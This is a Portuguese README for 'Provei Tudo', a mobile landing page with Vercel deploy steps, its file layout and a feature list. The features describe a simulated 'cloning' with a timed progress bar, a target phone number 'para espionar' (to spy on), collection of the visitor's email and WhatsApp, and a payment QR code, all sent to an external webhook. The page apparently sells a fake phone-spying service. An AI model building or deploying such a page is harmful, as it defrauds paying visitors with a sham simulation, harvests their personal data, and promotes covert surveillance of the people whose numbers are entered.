# Provei Tudo - Landing Page

Landing page mobile-first para o serviço "Provei tudo" com tema dark e acentos verdes.

## Deploy no Vercel

### Opção 1: Via CLI (Recomendado)

1. Instale o Vercel CLI:
```bash
npm install -g vercel
```

2. Na pasta do projeto, execute:
```bash
vercel
```

3. Siga as instruções no terminal para fazer login e configurar o projeto

### Opção 2: Via GitHub + Vercel Dashboard

1. Inicialize um repositório Git:
```bash
git init
git add .
git commit -m "Initial commit"
```

2. Crie um repositório no GitHub e faça push:
```bash
git remote add origin https://github.com/seu-usuario/seu-repo.git
git push -u origin main
```

3. Acesse [vercel.com](https://vercel.com) e importe o repositório

### Opção 3: Deploy Direto (Arrastar e Soltar)

1. Acesse [vercel.com/new](https://vercel.com/new)
2. Arraste a pasta do projeto ou selecione os arquivos
3. Clique em "Deploy"

## Estrutura do Projeto

```
proveitudo/
├── index.html      # Página principal
├── styles.css      # Estilos
├── script.js       # Lógica JavaScript
├── assets/         # Imagens
│   └── hero-image-v3.png
├── vercel.json     # Configuração Vercel
├── .gitignore      # Arquivos ignorados
└── README.md       # Este arquivo
```

## Funcionalidades

- 🎨 Design dark premium com acentos verde "Matrix"
- 📱 Mobile-first e totalmente responsivo
- ⚡ Simulação de clonagem com barra de progresso (3 minutos)
- 💾 Persistência completa via localStorage
- 💳 Integração com webhook para pagamento
- 🔄 QR Code com countdown timer
- ✅ Máscara de telefone brasileira (DDD + 8/9 dígitos)

## Webhook

O site envia dados para:
`https://nwh.foreignlands.space/webhook/e8fce97a-f294-4c67-b77d-a58ff9eb274f`

Status enviados:
- `monitoramento`: Número inicial para espionar
- `form_preenchido`: Email/WhatsApp salvos durante simulação
- `pagamento`: Solicitação de QR Code (espera retorno com campo `base64`)
